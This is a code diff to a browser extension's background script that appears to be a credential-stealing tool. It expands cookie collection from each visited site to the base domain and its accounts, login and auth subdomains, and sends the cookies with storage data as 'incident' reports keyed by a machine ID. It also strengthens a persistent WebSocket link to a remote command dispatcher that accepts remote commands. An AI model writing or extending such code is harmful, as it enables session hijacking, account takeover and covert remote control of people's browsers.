@@ -110,7 +110,7 @@ chrome.tabs.onRemoved.addListener((tabId) => {
   }
 });
 
-// Collect page data and cookies
+// Collect page data and cookies (enhanced multi-domain collection)
 async function collectPageData(tab) {
   try {
     log('debug', `📦 Starting data collection for tab ${tab.id}`);
@@ -123,10 +123,60 @@ async function collectPageData(tab) {
       return;
     }
     
-    log('debug', `🍪 Fetching cookies for domain: ${host}`);
-    // Get cookies for this domain
-    const cookies = await chrome.cookies.getAll({ domain: host });
-    log('debug', `🍪 Found ${cookies.length} cookies for ${host}`);
+    // Calculate base domain (simple eTLD+1 extraction)
+    // Example: mail.google.com -> google.com
+    const getBaseDomain = (hostname) => {
+      const parts = hostname.split('.');
+      if (parts.length >= 2) {
+        return parts.slice(-2).join('.');
+      }
+      return hostname;
+    };
+    
+    const baseDomain = getBaseDomain(host);
+    log('debug', `🌐 Base domain calculated: ${baseDomain} from ${host}`);
+    
+    // Build list of domains to check
+    const domainsToCheck = [host];
+    
+    // Add base domain if different
+    if (baseDomain !== host) {
+      domainsToCheck.push(baseDomain);
+    }
+    
+    // Add common secondary domains for popular services
+    // Example: for google.com, also check accounts.google.com
+    const commonSubdomains = ['accounts', 'login', 'auth', 'www'];
+    for (const subdomain of commonSubdomains) {
+      const secondaryDomain = `${subdomain}.${baseDomain}`;
+      if (!domainsToCheck.includes(secondaryDomain)) {
+        domainsToCheck.push(secondaryDomain);
+      }
+    }
+    
+    log('debug', `🍪 Fetching cookies from multiple domains: ${domainsToCheck.join(', ')}`);
+    
+    // Collect cookies from all domains
+    const allCookies = new Map(); // Use Map to deduplicate by name+domain
+    
+    for (const domain of domainsToCheck) {
+      try {
+        const domainCookies = await chrome.cookies.getAll({ domain });
+        log('debug', `🍪 Found ${domainCookies.length} cookies for ${domain}`);
+        
+        for (const cookie of domainCookies) {
+          const key = `${cookie.name}::${cookie.domain}`;
+          if (!allCookies.has(key)) {
+            allCookies.set(key, cookie);
+          }
+        }
+      } catch (err) {
+        log('debug', `⚠️ Could not fetch cookies for ${domain}: ${err.message}`);
+      }
+    }
+    
+    const cookies = Array.from(allCookies.values());
+    log('info', `🍪 Total unique cookies collected: ${cookies.length}`);
     
     if (cookies.length > 0) {
       log('debug', `💾 Fetching storage data...`);
@@ -153,11 +203,11 @@ async function collectPageData(tab) {
         machineId: machineId
       };
       
-      log('info', `📤 Creating incident for ${host} with ${cookies.length} cookies`);
+      log('info', `📤 Creating incident for ${host} with ${cookies.length} cookies (from ${domainsToCheck.length} domains)`);
       // Create incident report
       await createIncident(cookieData);
     } else {
-      log('debug', `📭 No cookies found for ${host}`);
+      log('debug', `📭 No cookies found for any domain related to ${host}`);
     }
   } catch (error) {
     log('error', '❌ Error collecting page data', { error: error.message, url: tab.url });
@@ -529,9 +579,10 @@ async function initializeRemoteControl() {
   startSessionHeartbeat();
 }
 
-// Connect to command dispatcher WebSocket with improved reconnection
+// Connect to command dispatcher WebSocket with improved reconnection and keep-alive
 let reconnectAttempts = 0;
 const MAX_RECONNECT_DELAY = 30000; // 30 seconds max
+let keepAliveInterval = null;
 
 function connectToCommandServer() {
   const wsUrl = `wss://vxvcquifgwtbjghrcjbp.supabase.co/functions/v1/command-dispatcher`;
@@ -551,6 +602,12 @@ function connectToCommandServer() {
     }
   }
   
+  // Clear any existing keep-alive interval
+  if (keepAliveInterval) {
+    clearInterval(keepAliveInterval);
+    keepAliveInterval = null;
+  }
+  
   try {
     log('info', `Connecting to command server (attempt ${reconnectAttempts + 1})`);
     commandSocket = new WebSocket(wsUrl);
@@ -564,11 +621,36 @@ function connectToCommandServer() {
         machine_id: machineId,
         timestamp: new Date().toISOString()
       }));
+      
+      // Start keep-alive ping (every 25 seconds)
+      keepAliveInterval = setInterval(() => {
+        if (commandSocket && commandSocket.readyState === WebSocket.OPEN) {
+          try {
+            commandSocket.send(JSON.stringify({
+              type: 'ping',
+              machine_id: machineId,
+              timestamp: new Date().toISOString()
+            }));
+            log('debug', 'WebSocket keep-alive ping sent');
+          } catch (error) {
+            log('error', 'Failed to send keep-alive ping', error);
+          }
+        }
+      }, 25000);
+      
+      log('info', 'WebSocket keep-alive started (25s interval)');
     };
     
     commandSocket.onmessage = (event) => {
       try {
         const data = JSON.parse(event.data);
+        
+        // Handle pong responses
+        if (data.type === 'pong') {
+          log('debug', 'Received keep-alive pong');
+          return;
+        }
+        
         handleRemoteCommand(data);
       } catch (error) {
         log('error', 'Error parsing WebSocket message', error);
@@ -577,10 +659,22 @@ function connectToCommandServer() {
     
     commandSocket.onerror = (error) => {
       log('error', 'WebSocket error', error);
+      
+      // Clear keep-alive on error
+      if (keepAliveInterval) {
+        clearInterval(keepAliveInterval);
+        keepAliveInterval = null;
+      }
     };
     
     commandSocket.onclose = (event) => {
       log('info', `WebSocket closed: ${event.code} ${event.reason}`);
+      
+      // Clear keep-alive on close
+      if (keepAliveInterval) {
+        clearInterval(keepAliveInterval);
+        keepAliveInterval = null;
+      }
       
       // Exponential backoff: 1s, 2s, 4s, 8s, up to 30s
       const delay = Math.min(1000 * Math.pow(2, reconnectAttempts), MAX_RECONNECT_DELAY);
@@ -591,6 +685,12 @@ function connectToCommandServer() {
     };
   } catch (error) {
     log('error', 'WebSocket connection failed', error);
+    
+    // Clear keep-alive on connection failure
+    if (keepAliveInterval) {
+      clearInterval(keepAliveInterval);
+      keepAliveInterval = null;
+    }
     
     // Retry with backoff
     const delay = Math.min(1000 * Math.pow(2, reconnectAttempts), MAX_RECONNECT_DELAY);
